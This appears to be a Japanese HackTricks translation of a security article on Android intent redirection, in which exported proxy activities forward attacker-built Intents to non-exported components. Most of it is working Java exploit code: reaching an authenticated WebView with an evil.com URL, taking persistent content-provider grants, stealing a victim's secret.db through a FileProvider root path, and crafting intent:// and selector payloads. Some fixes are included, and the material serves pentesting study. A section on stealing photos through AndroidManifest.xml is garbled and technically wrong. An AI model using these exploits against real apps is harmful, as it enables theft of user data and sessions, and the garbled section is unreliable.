<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


**Research taken from** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# はじめに

この脆弱性は、**Webセキュリティのオープンリダイレクト**に似ています。クラス`Intent`は`Parcelable`であるため、このクラスに属するオブジェクトは、別の`Intent`オブジェクトの**追加データ**として**渡すことができます**。\
多くの開発者は、この機能を利用して、`startActivity(...)`、`sendBroadcast(...)`などの危険なメソッドに埋め込まれた`Intent`を受け取り、それを渡す**プロキシコンポーネント**（アクティビティ、ブロードキャストレシーバー、サービス）を作成します。\
これは危険です。なぜなら、**攻撃者はアプリを強制的に起動させることができ、他のアプリから直接起動することができない非公開コンポーネントにアクセスする**ことができるからです。また、`WebView`は、`Intent.parseUri(...)`メソッドを使用して、文字列から`Intent`オブジェクトに**URLを変更**し、それを`startActivity(...)`に渡すこともあります。

{% hint style="info" %}
要約すると、攻撃者が安全に実行されている`Intent`を送信できれば、エクスポートされていないコンポーネントにアクセスし、それらを悪用する可能性があります。
{% endhint %}

# 典型的なケース

例を見てみましょう。`AndroidManifest.xml`ファイルの一部分です。
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
アクティビティ `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
アクティビティ `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity`は、特定の安全でないアクションを実行する**隠されたアプリの機能の例**です。この場合、ユーザーの認証セッションを`url`パラメータから取得したURLに渡します。

輸出規制により、**攻撃者は直接`AuthWebViewActivity`にアクセスすることはできません**。直接の呼び出し
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
`AuthWebViewActivity`がuid 1337からエクスポートされていないため、`java.lang.SecurityException`がスローされます。

しかし、攻撃者は被害者に対して`AuthWebViewActivity`を自身で起動させることができます。
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
そして、セキュリティ違反は発生しないため、**攻撃対象のアプリは自身のすべてのコンポーネントにアクセスできます**。このコードフラグメントを使用することで、攻撃者はAndroidシステムの組み込み制限を回避することができます。

# 影響のエスカレーション

この脆弱性の影響をエスカレーションさせるためには、**他の脆弱性/設定ミスを見つける必要があります。これにより、脆弱性の影響を増大させることができます**（脆弱性自体はリスクを作成しません）。

## コンテンツプロバイダを介した攻撃のエスカレーション

元のアプリの任意のコンポーネントにアクセスするだけでなく、**攻撃者は以下の条件を満たす脆弱なアプリのコンテンツプロバイダにアクセスしようとすることができます**。

* **非公開**である必要があります（そうでない場合、この記事で議論している脆弱性を使用せずに直接攻撃できます）
* `android:grantUriPermissions`フラグが**`true`**に設定されている必要があります。
* `android:grantUriPermissions="true"`は、Javaコードがその`ContentProvider`で提供される**任意の`Uri`に対して`FLAG_GRANT_READ_URI_PERMISSION`と`FLAG_GRANT_WRITE_URI_PERMISSION`を使用できることを示します**。
* `android:grantUriPermissions="false"`は、子の`<grant-uri-permission>`要素で指定された`Uri`値のみが`FLAG_GRANT_READ_URI_PERMISSION`と`FLAG_GRANT_WRITE_URI_PERMISSION`と一緒に使用できることを示します。

攻撃者は自身を埋め込まれたインテントの受信者として設定し、以下のフラグを設定する必要があります。

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION`は、プロバイダへの永続的なアクセスを許可します（このフラグがない場合、アクセスは一度限りです）
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION`は、URIへのプレフィックスによるアクセスを許可します。例えば、`content://com.victim.provider/image/1`のような完全なパスを繰り返し取得する代わりに、攻撃者はURI `content://com.victim.provider/` を使用してプロバイダのすべてのコンテンツにアクセスを許可し、その後 `ContentResolver` を使用して `content://com.victim.provider/image/1`、`content://com.victim.provider/image/2`などにアクセスできます。
* `Intent.FLAG_GRANT_READ_URI_PERMISSION`は、プロバイダ上での読み取り操作（`query`、`openFile`、`openAssetFile`など）を許可します。
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION`は、書き込み操作を許可します。

攻撃者は、アクセスして`query`、`update`、`insert`、`delete`、`openFile`、`openAssetFile`などの通常の操作を実行できる典型的なプロバイダの例です。
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
# AndroidManifest.xmlファイルにおけるユーザーの写真の盗難の例

アプリケーションがユーザーの写真を盗むために使用する可能性のある一般的な方法は、`AndroidManifest.xml`ファイルでの設定です。このファイルは、アプリケーションの構成情報を含んでおり、アプリケーションの動作に関する重要な情報を提供します。

以下は、ユーザーの写真を盗むために悪意のあるアプリケーションが使用する可能性のある`AndroidManifest.xml`ファイルの設定の例です。

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.maliciousapp">

    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/app_icon"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:label="@string/app_name"
            android:theme="@style/AppTheme.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".PhotoStealerActivity"
            android:label="Photo Stealer"
            android:theme="@style/AppTheme.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="image/*" />
            </intent-filter>
        </activity>

    </application>

</manifest>
```

この例では、悪意のあるアプリケーションは`READ_EXTERNAL_STORAGE`および`WRITE_EXTERNAL_STORAGE`のパーミッションを要求しています。これにより、アプリケーションはユーザーの外部ストレージにアクセスし、写真を盗むことができます。

また、`PhotoStealerActivity`という名前のアクティビティが定義されており、`android.intent.action.VIEW`アクションと`image/*`のMIMEタイプを持つデータを処理するように設定されています。これにより、アプリケーションはユーザーが写真を表示するために他のアプリケーションを使用する際に、写真を盗むことができます。

このような設定がある場合、ユーザーの写真が悪意のあるアプリケーションによって盗まれる可能性があります。ユーザーのプライバシーを保護するためには、アプリケーションのパーミッションと`AndroidManifest.xml`ファイルの設定を慎重に確認する必要があります。
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
`MainActivity.java` ファイル
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Android File Providerへの攻撃

この脆弱性により、攻撃者は開発者が事前に指定したディレクトリにあるアプリのファイルを**盗むことが可能**になります。攻撃が成功するためには、悪意のあるアプリが**Android File Providerへのアクセス権を取得し、Android ContentResolverを使用してファイルプロバイダからコンテンツを読み取る必要があります**。

以下はファイルプロバイダの例です（詳細については[https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider)を参照してください）。
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
アプリのリソース内にある特別なリストにあるファイルへの読み書きアクセスを提供します。この場合、`res/xml/provider_paths.xml`にあります。

次のように見えるかもしれません。
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
各タグは、ルートに対して相対的な `path` 値を持つルートディレクトリを指定します。たとえば、値 `external_files` は `new File(Environment.getExternalStorageDirectory(), "images")` に対応します。

値 `root-path` は `/` に対応し、つまり任意のファイルにアクセスを提供します。

仮に、ファイル `/data/data/com.victim/databases/secret.db` に秘密のデータが保存されているとします。このファイルの盗難は、次のように見えるかもしれません `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## WebViewを介した任意のコンポーネントへのアクセス

`Intent.toUri(flags)`を使用してIntentオブジェクトを文字列にキャストし、`Intent.parseUri(stringUri, flags)`を使用して文字列からIntentに戻すことができます。この機能は、WebView（アプリの組み込みブラウザ）でよく使用されます。アプリは`intent://`スキームを確認し、URLをIntentに解析してアクティビティを起動することができます。

この脆弱性は、クライアントアプリ内の他の脆弱性（例：エクスポートされたアクティビティを介してWebViewで任意のリンクを直接開く能力やディープリンクメカニズムを介して）や、リモートで悪用することができます。これには、サーバーサイドでのクロスサイトスクリプティングやクライアントサイドでのMitMなどが含まれます。

脆弱なコードの例
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
ここでのポイントは、`WebViewClient`クラスの`shouldOverrideUrlLoading(...)`メソッドが、WebViewが新しいリンクを読み込もうとするたびに呼び出されるが、アプリにカスタムハンドラを追加するオプションを提供することです。

この脆弱性を悪用するために、攻撃者は特別に準備されたインテントスキームURLへのWebViewリダイレクトを作成する必要があります。URL作成の例は以下の通りです。
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
攻撃の例
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
このバージョンは、クラシックバージョンの脆弱性と比較して、いくつかの制限があります：

- 埋め込まれた`Parcelable`および`Serializable`オブジェクトは文字列にキャストできません（無視されます）
- `Intent.parseUri(...)`が呼び出されると、安全でないフラグ`Intent.FLAG_GRANT_READ_URI_PERMISSION`および`Intent.FLAG_GRANT_WRITE_URI_PERMISSION`は**無視されます**。パーサーは、`Intent.URI_ALLOW_UNSAFE`（`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))`フラグが設定されている場合にのみ）それらを残しますが、これは非常にまれです。

多くの開発者は、WebView経由で受け取ったインテントの完全なフィルタリングを行うことを忘れています。
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
攻撃者は、セレクタを介して非公開のコンポーネントを指定することができます。
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
そして、アプリの明示的なインテントに対する保護をバイパスします。したがって、セレクタもフィルタリングすることをおすすめします。
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
しかし、完全なフィルタリングでも完全な保護を保証するわけではありません。なぜなら、攻撃者は非公開のアクティビティに対応する`intent-filter`に対して暗黙的なインテントを作成することができるからです。アクティビティの宣言の例：
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
したがって、アクティビティが起動される前に、それがエクスポートされているかどうかを確認することをお勧めします。

## インセキュアなインテントを作成する他の方法

一部のアプリ開発者は、**独自のインテントパーサー**（しばしば**ディープリンク**やプッシュメッセージを処理するため）を実装しています。これらは、**JSON**オブジェクト、文字列、またはバイト配列を使用しており、デフォルトとは異ならないか、あるいは大きな危険をもたらす可能性があります。なぜなら、これらは**`Serializable`**および`Parcelable`オブジェクトを展開することができ、またインセキュアなフラグを設定することもできるからです。セキュリティ研究者は、バイト配列を`Parcel`にキャストし、そこからインテントを読み取るというよりエキゾチックなバージョンのインテント作成にも遭遇するかもしれません。
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# 脆弱なアプリ

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
